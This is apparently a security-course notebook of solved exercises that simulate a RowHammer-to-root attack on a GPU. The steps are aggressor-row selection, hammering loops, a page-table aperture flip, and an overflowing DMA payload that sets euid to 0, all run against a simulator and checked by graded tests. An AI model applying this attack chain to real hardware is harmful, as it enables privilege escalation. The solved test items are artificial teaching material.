In [2]:
# Import the GPUBreach simulator
import sys
from collections.abc import Callable
from pathlib import Path

_here = Path.cwd().resolve()
for _path in [
    str(_here),
    str(_here.parent),
]:
    if _path not in sys.path:
        sys.path.insert(0, _path)

from aisb_utils import report
from gpubreach_sim import *

In [3]:
env = make_environment()

print("── Initial GPUBreach environment ──")
print(f"  PTE victim row      = {PTE_ROW} (DRAM row holding the target PTE)")
print(f"  PTE offset in row   = {PTE_OFFSET_IN_ROW} bytes from row start")
print(f"  GPU virtual address = 0x{VICTIM_GPU_VADDR:x} "
      f"(resolves via the PTE we'll corrupt)")
print(f"  PTE aperture        = {env.victim_pte.aperture} "
      f"(0 = GPU VRAM, 1 = system memory)")
print(f"  Kernel euid         = {env.kernel_cred.euid} "
      f"(0 would mean root)")
print(f"  Hammer threshold    = {HAMMER_THRESHOLD_ACTIVATIONS:,} "
      f"activations per aggressor")
print(f"  ACTIVATE-PRECHARGE  = {ACTIVATE_PRECHARGE_NS} ns")
print(f"  Refresh window      = {REFRESH_WINDOW_MS} ms")
print(f"  Driver buffer size  = {DRIVER_BUFFER_SIZE} bytes "
      f"(cred struct at offset {CRED_OFFSET} in a {PAGE_SIZE} byte page)")

── Initial GPUBreach environment ──
  PTE victim row      = 4242 (DRAM row holding the target PTE)
  PTE offset in row   = 32 bytes from row start
  GPU virtual address = 0xdead0000 (resolves via the PTE we'll corrupt)
  PTE aperture        = 0 (0 = GPU VRAM, 1 = system memory)
  Kernel euid         = 1000 (0 would mean root)
  Hammer threshold    = 150,000 activations per aggressor
  ACTIVATE-PRECHARGE  = 65 ns
  Refresh window      = 64 ms
  Driver buffer size  = 128 bytes (cred struct at offset 128 in a 4096 byte page)


# Exercise 2.1: Aggressor rows for double-sided hammering

In [4]:

def find_aggressors(victim_row: int) -> tuple[int, int]:
    """Return the two aggressor rows for double-sided hammering."""
    # TODO: Return (aggressor_a, aggressor_b) such that victim_row is between them
    # and |aggressor_a - aggressor_b| == 2
    if victim_row == 0:
        return (0, 2)
    elif victim_row >= ROWS_PER_BANK - 1:
        return (victim_row - 2, victim_row - 1)
    else:
        return (victim_row - 1, victim_row + 1)


agg_a, agg_b = find_aggressors(PTE_ROW)
print(f"Ex 2.1: aggressors for PTE_ROW={PTE_ROW} → {agg_a}, {agg_b}")
from day6_final_test import test_find_aggressors


test_find_aggressors(find_aggressors)

env.stage1_aggressors_ok = True

Ex 2.1: aggressors for PTE_ROW=4242 → 4241, 4243
  Aggressor geometry correct!
day6_final_test.test_find_aggressors passed.


# Exercise 2.2: Hammer until a bit flips

In [6]:

def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_rounds: int = 2_000_000) -> dict:
    """Drive the DRAM into a RowHammer flip on ``victim_row``."""
    # TODO:
    # 1. Initialise total_ns and rounds counters.
    # 2. While `dram.has_flipped(victim_row)` is False (and you are
    #    below `max_rounds`):
    #      - call dram.hammer_once(aggressor_a, aggressor_b)
    #      - add its return value (nanoseconds) to total_ns
    #      - increment rounds
    # 3. Return {"rounds": rounds, "total_ns": total_ns,
    #            "flipped": dram.has_flipped(victim_row)}
    total_ns = 0
    rounds = 0
    while not dram.has_flipped(victim_row) and rounds < max_rounds:
        round_ns = dram.hammer_once(agg_a, agg_b)
        total_ns += round_ns
        rounds += 1
    return {
        "flipped": dram.has_flipped(victim_row),
        "rounds": rounds,
        "total_ns": total_ns
    }

flip_run = hammer_until_flip(env.dram, agg_a, agg_b, PTE_ROW)
print(
    f"Ex 2.2: flipped={flip_run['flipped']} after "
    f"{flip_run['rounds']:,} rounds "
    f"({flip_run['total_ns'] / 1_000_000:.2f} ms)"
)
from day6_final_test import test_hammer_until_flip


test_hammer_until_flip(hammer_until_flip)

env.stage2_flipped_in_refresh_window = (
    flip_run["flipped"]
    and flip_run["total_ns"] / 1_000_000 < REFRESH_WINDOW_MS
)

Ex 2.2: flipped=True after 150,000 rounds (19.50 ms)
  Hammer loop and cycle accounting correct!
day6_final_test.test_hammer_until_flip passed.


# Exercise 2.3: Force the MMU to re-walk the flipped PTE

In [7]:
def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
    """Resync the PT from DRAM. Return (before_aperture, after_aperture)."""
    # TODO: Capture before value, call sync_from_dram, capture after value
    before = env.page_table.cached_pte.aperture
    env.page_table.sync_from_dram(env.dram)
    after = env.page_table.cached_pte.aperture
    return (before, after)


before, after = trigger_pte_refresh(env)
print(f"Ex 2.3: aperture {before} → {after} (expected 0 → 1)")
from day6_final_test import test_trigger_pte_refresh


test_trigger_pte_refresh(trigger_pte_refresh)

env.stage3_aperture_changed = (before, after) == (
    APERTURE_GPU_LOCAL,
    APERTURE_SYSTEM,
)

Ex 2.3: aperture 0 → 1 (expected 0 → 1)
  PT resync propagated the flip!
day6_final_test.test_trigger_pte_refresh passed.


# Exercise 2.4: Craft the OOB DMA payload

In [8]:
def craft_overflow_payload(new_euid: int = 0) -> bytes:
    """Return a DMA payload that overflows the driver buffer into euid."""
    # TODO:
    # 1. Fill `DRIVER_BUFFER_SIZE` bytes (e.g. b"A" repeated).
    # 2. Append the little-endian 4-byte encoding of `new_euid`.
    # 3. Return filler + euid_bytes.
    return b"A" * DRIVER_BUFFER_SIZE + new_euid.to_bytes(4, "little")


payload = craft_overflow_payload()
print(
    f"Ex 2.4: payload={len(payload)} bytes "
    f"({DRIVER_BUFFER_SIZE} filler + 4 euid)"
)
from day6_final_test import test_craft_overflow_payload


test_craft_overflow_payload(craft_overflow_payload)

Ex 2.4: payload=132 bytes (128 filler + 4 euid)
  Payload layout correct!
day6_final_test.test_craft_overflow_payload passed.


# Exercise 2.5: Fire the DMA and confirm root

In [9]:
def escalate_privileges(env: Environment, payload: bytes) -> bool:
    """Perform the DMA. Return True iff the cred struct now shows root."""
    # TODO:
    # 1. Call perform_gpu_dma(payload, VICTIM_GPU_VADDR,
    #    env.page_table, env.iommu, env.dram, env.driver_page).
    # 2. Return env.kernel_cred.is_root().
    perform_gpu_dma(payload, VICTIM_GPU_VADDR, env.page_table, env.iommu, env.dram, env.driver_page)
    return env.kernel_cred.is_root()


rooted = escalate_privileges(env, payload)
print(f"Ex 2.5: root achieved? {rooted}")
from day6_final_test import test_escalate_privileges


test_escalate_privileges(escalate_privileges)

env.stage4_root_obtained = rooted

Ex 2.5: root achieved? True
  End-to-end escalation succeeded!
day6_final_test.test_escalate_privileges passed.


In [10]:
env.check_all()

── GPUBreach attack chain ──
  ✓ Stage 1 — aggressor rows identified
  ✓ Stage 2 — flip landed inside the 64ms refresh window
  ✓ Stage 3 — aperture bit flipped in the live PTE
  ✓ Stage 4 — OOB DMA wrote euid=0 into the cred struct

  🎉 All stages succeeded — root achieved.
  FLAG{gpubreach_rowhammer_aperture_oob_root}


True

# Exercise 3.1 (Optional): Decode a PTE by hand

In [11]:
def decode_pte_manually(raw: bytes) -> dict:
    """Hand-decoded PTE — do not call gpubreach_sim.decode_pte."""
    # TODO: pick apart raw[0], raw[1:7], bit by bit.
    assert len(raw) == PTE_BYTES
    flags = raw[0]
    return {
        "valid": bool(flags & 1),
        "aperture": (flags >> APERTURE_BIT_POS) & 1,
        "physical_frame": int.from_bytes(raw[1:7], "little"),
    }


# A sample PTE: valid=1, aperture=1, PFN=0xABCDEF
sample = bytes([0b0000_0011]) + (0xABCDEF).to_bytes(6, "little") + b"\x00"
print(f"Ex 3.1: decoded = {decode_pte_manually(sample)}")
from day6_final_test import test_decode_pte_manually


test_decode_pte_manually(decode_pte_manually)

Ex 3.1: decoded = {'valid': True, 'aperture': 1, 'physical_frame': 11259375}
  Hand-decoded PTE matches the simulator's decode!
day6_final_test.test_decode_pte_manually passed.


# Exercise 3.2 (Optional): Inspect the exact flipped bit

In [12]:
def find_flipped_bits(before: bytes, after: bytes) -> set[tuple[int, int]]:
    """Return {(byte_index, bit_position), ...} where before != after."""
    # TODO: iterate over pairs of bytes, XOR them, and record each
    # differing bit as (byte_index, bit_position).
    flips: set[tuple[int, int]] = set()
    for i, (b, a) in enumerate(zip(before, after)):
        diff = b ^ a
        for bit in range(8):
            if (diff >> bit) & 1:
                flips.add((i, bit))
    return flips


fresh3 = make_environment()
pre = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
while not fresh3.dram.has_flipped(PTE_ROW):
    fresh3.dram.hammer_once(PTE_ROW - 1, PTE_ROW + 1)
post = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
print(f"Ex 3.2: flipped bits = {find_flipped_bits(pre, post)}")
from day6_final_test import test_find_flipped_bits


test_find_flipped_bits(find_flipped_bits)

Ex 3.2: flipped bits = {(0, 1)}
  Exactly one flip, at the aperture bit — as templated!
day6_final_test.test_find_flipped_bits passed.


# Exercise 3.3 (Optional): Budget the hammer against the refresh window

In [13]:

def hammer_budget(threshold: int = HAMMER_THRESHOLD_ACTIVATIONS, tRC_ns: int = ACTIVATE_PRECHARGE_NS, refresh_ms: int = REFRESH_WINDOW_MS) -> dict:
    """Compute worst-case hammering cost."""
    rounds = threshold  # one activation per aggressor per round
    total_ns = rounds * 2 * tRC_ns
    total_ms = total_ns / 1_000_000
    return {
        "rounds": rounds,
        "total_ns": total_ns,
        "total_ms": total_ms,
        "fits_refresh_window": total_ms < refresh_ms,
    }

budget = hammer_budget()
print(
    f"Ex 3.3: {budget['rounds']:,} rounds × {2 * ACTIVATE_PRECHARGE_NS} ns "
    f"= {budget['total_ms']:.2f} ms "
    f"(fits 64ms window: {budget['fits_refresh_window']})"
)
from day6_final_test import test_hammer_budget


test_hammer_budget(hammer_budget)

Ex 3.3: 150,000 rounds × 130 ns = 19.50 ms (fits 64ms window: True)
  Budget arithmetic correct!
day6_final_test.test_hammer_budget passed.


# Exercise 3.4 (Optional): Maximum hammer rounds inside the window

In [14]:
def max_rounds_in_window(refresh_ms: int = REFRESH_WINDOW_MS, tRC_ns: int = ACTIVATE_PRECHARGE_NS) -> int:
    """Maximum rounds that fit in refresh window."""
    per_round = 2 * tRC_ns
    budget_ns = refresh_ms * 1_000_000
    return budget_ns // per_round


max_rounds = max_rounds_in_window()
headroom = max_rounds / HAMMER_THRESHOLD_ACTIVATIONS
print(
    f"Ex 3.4: up to {max_rounds:,} rounds fit in {REFRESH_WINDOW_MS} ms "
    f"→ {headroom:.1f}× threshold headroom"
)
from day6_final_test import test_max_rounds_in_window


test_max_rounds_in_window(max_rounds_in_window)

Ex 3.4: up to 492,307 rounds fit in 64 ms → 3.3× threshold headroom
  Budget arithmetic and parameterisation both correct!
day6_final_test.test_max_rounds_in_window passed.


# Exercise 3.5 (Optional): The IOMMU blocks what it promises to block

In [15]:
def probe_iommu(env: Environment) -> dict:
    """Probe IOMMU enforcement."""
    from gpubreach_sim.dma import DriverPage
    return {
        "intra_page_ok": env.iommu.validate(env.driver_page, 0, PAGE_SIZE),
        "overflow_page": env.iommu.validate(env.driver_page, 0, PAGE_SIZE + 1),
        "other_page": env.iommu.validate(DriverPage(), 0, 64),
    }

probe = probe_iommu(env)
print(f"Ex 3.5: IOMMU probe = {probe}")
from day6_final_test import test_probe_iommu


test_probe_iommu(probe_iommu)

Ex 3.5: IOMMU probe = {'intra_page_ok': True, 'overflow_page': False, 'other_page': False}
  IOMMU enforces what it promises — and no more!
day6_final_test.test_probe_iommu passed.


# Exercise 3.6 (Optional): Measure the OOB overflow precisely

In [17]:
def overflow_bytes(payload_len: int) -> int:
    """Bytes that overflow past DRIVER_BUFFER_SIZE."""
    return max(0, payload_len - DRIVER_BUFFER_SIZE)


for n in [0, DRIVER_BUFFER_SIZE - 1, DRIVER_BUFFER_SIZE, DRIVER_BUFFER_SIZE + 4]:
    print(f"Ex 3.6: payload {n}B → overflow {overflow_bytes(n)}B")
from day6_final_test import test_overflow_bytes


test_overflow_bytes(overflow_bytes)

Ex 3.6: payload 0B → overflow 0B
Ex 3.6: payload 127B → overflow 0B
Ex 3.6: payload 128B → overflow 0B
Ex 3.6: payload 132B → overflow 4B
  Overflow arithmetic correct!
day6_final_test.test_overflow_bytes passed.


# Exercise 3.7 (Optional): A tighter payload

In [18]:
def craft_precise_payload(cred_offset_in_page: int, new_euid: int) -> bytes:
    """Precise payload targeting specific offset."""
    assert cred_offset_in_page >= DRIVER_BUFFER_SIZE
    return b"A" * cred_offset_in_page + new_euid.to_bytes(4, "little")


tight = craft_precise_payload(CRED_OFFSET, 0)
print(f"Ex 3.7: precise payload is {len(tight)} bytes")
from day6_final_test import test_craft_precise_payload


test_craft_precise_payload(craft_precise_payload)

Ex 3.7: precise payload is 132 bytes
  Precise payload placement correct!
day6_final_test.test_craft_precise_payload passed.
